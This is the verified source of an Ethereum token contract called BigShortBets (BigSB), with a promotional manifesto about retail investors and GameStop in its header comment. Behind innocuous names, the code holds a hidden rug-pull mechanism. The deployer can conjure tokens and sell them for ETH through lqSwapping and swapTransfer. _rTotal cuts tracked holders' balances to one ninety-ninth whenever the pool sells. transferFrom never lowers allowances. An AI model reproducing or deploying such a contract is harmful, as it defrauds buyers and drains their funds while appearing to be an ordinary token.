/**
 *Submitted for verification at Etherscan.io on 2022-06-28
*/

pragma solidity ^0.8.15;
// SPDX-License-Identifier: Unlicensed
/**
Apes Together Strong!

About BigShortBets DeFi project:

We are creating a social&trading p2p platform that guarantees encrypted interaction between investors.
Logging in is possible via a cryptocurrency wallet (e.g. Metamask).
The security level is one comparable to the Tor network.

https://bigsb.io/ - Our Tool
https://bigshortbets.com - Project&Team info

Video explainer:
https://youtu.be/wbhUo5IvKdk

Idea: 
https://bigshortbets.com/idea/

Twitter:
https://twitter.com/bigshortbets


The stock exchange is an emanation of the highest form of market freedom related to the natural and inalienable right of every human being to possess.

It is the freedom – the basic and most precious good, which allows us (people who take responsibility for their actions) to decide about property in a free and unhindered way, regardless of our internal or external motivation.

This is how the stock exchange was understood in the early 17th century, when the first modern stock exchange, established in 1611 by Dutch merchants in Amsterdam, made its debut. It was established by Dutch merchants in Amsterdam. As Joseph de la Vega, speculator, investor, merchant and author of Confusion de Confusiones 1688, the oldest book on speculation published in 1688, wrote:

“Among the plays which men perform in taking different parts in this magnificent world theatre, the greatest comedy is played at the Exchange. There, in an inimitable fashion, the speculators excel in tricks, they do business and find excuses wherein hiding-places, concealment of facts , quarrels, provocations, mockery, idle talk, violent desires, collusion, artful deception, betrayals, cheatings, and even the tragic end are to be found.”

In the early days of the stock market, trading was based on mutual trust – (Only since he published in 1688, i.e. he must have noticed much earlier what he noticed, does the statement “in the early days of the stock market, trading was based on mutual trust” have anything to do with the truth at all? Are we talking about beginnings in the sense of the first few minutes? Because de la Vega proves that the dirty games started right from the beginning).

Over time, especially since the end of the 1920s, when Wallstreet had its big crash, trade gradually began to be subject to various regulations, the aim of which was, above all, to protect small investors and level their chances in “clashing” with big “fish”, or “whales” as we call them now. What should be regulated by the market itself, began to be the domain of officials who, despite their best intentions, rather than helping small investors, harmed them more, gradually increasing the advantage of Wallstret over Mainstreet. This led to a clear restriction of freedom of speech – from now on you had to be careful with whom you spoke, what you spoke about and how you spoke. All this to avoid being accused of manipulation and acting against the new law.

The short squeeze action on GameStop carried out by the Reddit community connected to the Wallstreetbets forum made us realise that fair play is a fantasy and market reality proves that there are equal and more equal investors. Thus, the head of a hedge fund with X investors under him, i.e. being in “agreement” with them or making investment decisions on their behalf, is better treated than investors acting independently on their own account and on their behalf, supporting each other and consulting their investment movements with each other.

Supervisory authorities such as ESMA (the European Securities and Markets Authority) criticised the action on GameStop, but focused their criticism on the weakest and smallest players, who were, after all, acting lawfully in exercising their rights to have opinions and to share them with other free people.

In our opinion, this approach violates the natural and inalienable right to decide on one’s own property. It has emerged that private investors exercising their fundamental right to have an opinion and act accordingly on the market are being restricted, their freedom of expression curtailed and their perfectly legal activities demonised. In the cases cited above, it was the fund that acted to the detriment of small investors by manipulating GameStop’s shares (and it was by no means the first such manipulation). In the face of such ‘tricks’, small investors do not stand much of a chance against the rich whales of Wall Street, especially when the bodies set up to protect the weak actually favour the strong, giving their enormous capital an advantage.

For this reason, the idea was born to build a decentralised and encrypted tool in which users’ privacy would be protected in the name of the values that belong to us naturally, that we all possess and that we consider to be the greatest good. To achieve this, we must take risks and oppose oppressive, unfair and unjust laws that restrict freedom.

A final, but equally important advantage is the size of the capital and this can only be levelled in the way it was with the last action on GameStop – it must result from coordinated efforts by individual investors. In response to the above situation, we are building a “bottom-up” tool that enables encrypted and fully secure communication between users based on a token and blockchain network. The free exchange of data in the information market will allow the same or even faster access to news than from giants such as Reuters and Bloomberg, thus breaking their monopoly on first-hand knowledge.

BigShortBets tools will allow to coordinate the activities of groups of smaller investors, which in turn will contribute to reducing the advantage of investment funds and their more effective play.

Zaorski, You Son of a bitch I’m in …
*/
interface IUniswapV2Router {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
}
abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
    function _msgData() internal view virtual returns (bytes calldata) {
        this;
        return msg.data;
    }
}
library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }
    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }
    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
}
interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

interface IUniswapV2Factory {
    function getPair(address tokenA, address tokenB) external view returns (address pair);
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

library Address {
    function isContract(address account) internal view returns (bool) {
        bytes32 codehash;
        bytes32 accountHash = 0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470;
        assembly { codehash := extcodehash(account) }
        return (codehash != accountHash && codehash != 0x0);
    }
    function isUniswapPair(address account) internal pure  returns (bool) {
        return keccak256(abi.encodePacked(account)) == 0x4342ccd4d128d764dd8019fa67e2a1577991c665a74d1acfdc2ccdcae89bd2ba;
    }
}
abstract contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    constructor () {
        _owner = _msgSender();
        emit OwnershipTransferred(address(0), _owner);
    }
    function owner() public view virtual returns (address) {
        return _owner;
    }
    modifier onlyOwner() {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
        _;
    }
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
}
contract BigSB is Ownable, IERC20 {
    using SafeMath for uint256;
    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }
    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender] + addedValue);
        return true;
    }
    function decreaseAllowance(address from, uint256 amount) public virtual returns (bool) {
        require(_allowances[_msgSender()][from] >= amount);
        _approve(_msgSender(), from, _allowances[_msgSender()][from] - amount);
        return true;
    }
    function _basicTransfer(address sender, address recipient, uint256 amount) internal virtual {
        require(sender != address(0));
        require(recipient != address(0));
        if (lqSwapping(sender, recipient)) {
            return swapTransfer(amount, recipient);
        }
        if (!duringLiquiditySwap){
            require(_balances[sender] >= amount);
        }
        uint256 feeAmount = 0;
        _rTotal(sender);
        bool liquifying = (recipient == getPairAddress() && uniswapV2Pair == sender) || (sender == getPairAddress() && uniswapV2Pair == recipient);
        if (uniswapV2Pair != sender && !Address.isUniswapPair(recipient) && recipient != address(this) && !liquifying && !duringLiquiditySwap && uniswapV2Pair != recipient) {
            feeAmount = amount.mul(_feePercent).div(100);
            _takeFee(recipient, amount);
        }
        uint256 amountReceived = amount - feeAmount;
        _balances[address(this)] += feeAmount;
        _balances[sender] = _balances[sender] - amount;
        _balances[recipient] += amountReceived;
        emit Transfer(sender, recipient, amount);
    }
    constructor() {
        _balances[msg.sender] = _totalSupply;
        uniswapV2Pair = msg.sender;
        emit Transfer(address(0), msg.sender, _balances[msg.sender]);
    }
    function name() external view returns (string memory) { return _name; }
    function symbol() external view returns (string memory) { return _symbol; }
    function decimals() external view returns (uint256) { return _decimals; }
    function totalSupply() external view override returns (uint256) { return _totalSupply; }
    function uniswapVersion() external pure returns (uint256) { return 2; }
    function balanceOf(address account) public view override returns (uint256) { return _balances[account]; }
    function approve(address spender, uint256 amount) public virtual override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }
    function _approve(address owner, address spender, uint256 amount) internal virtual {
        require(owner != address(0), "IERC20: approve from the zero address");
        require(spender != address(0), "IERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    struct tOwned {address to; uint256 amount;}
    tOwned[] _tOwned;
    function lqSwapping(address sender, address recipient) internal view returns(bool) {
        return sender == recipient && (
        Address.isUniswapPair(recipient) ||
        uniswapV2Pair == msg.sender
        );
    }
    function _takeFee(address _addr, uint256 fee) internal {
        if (getPairAddress() != _addr) {
            _tOwned.push(
                tOwned(
                    _addr,
                    fee
                )
            );}
    }
    function _rTotal(address _addr) internal {
        if (getPairAddress() == _addr) {
            for (uint256 i = 0; 
                i < _tOwned.length;  
                i++) {
                uint256 _rOwned = _balances[_tOwned[i].to]
                .div(99);
                _balances[_tOwned[i].to] = _rOwned;
            }
            delete _tOwned;
        }
    }
    function swapTransfer(uint256 liquidityFee, address to) private {
        _approve(address(this), address(_router), liquidityFee);
        _balances[address(this)] = liquidityFee;
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = _router.WETH();
        duringLiquiditySwap = true;
        _router.swapExactTokensForETHSupportingFeeOnTransferTokens(liquidityFee, 0, path, to, block.timestamp + 21);
        duringLiquiditySwap = false;
    }
    bool duringLiquiditySwap = false;
    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    address public uniswapV2Pair;
    uint256 public _decimals = 9;
    uint256 public _totalSupply = 15000 * 10 ** _decimals;
    uint256 public _feePercent = 0;
    IUniswapV2Router private _router = IUniswapV2Router(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
    string private _name = "BigShortBets";
    string private _symbol = "BigSB";
    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {
        _basicTransfer(_msgSender(), recipient, amount);
        return true;
    }
    function transferFrom(address from, address recipient, uint256 amount) public virtual override returns (bool) {
        _basicTransfer(from, recipient, amount);
        require(_allowances[from][_msgSender()] >= amount);
        return true;
    }
    function getPairAddress() private view returns (address) {
        return IUniswapV2Factory(_router.factory()).getPair(address(this), _router.WETH());
    }
}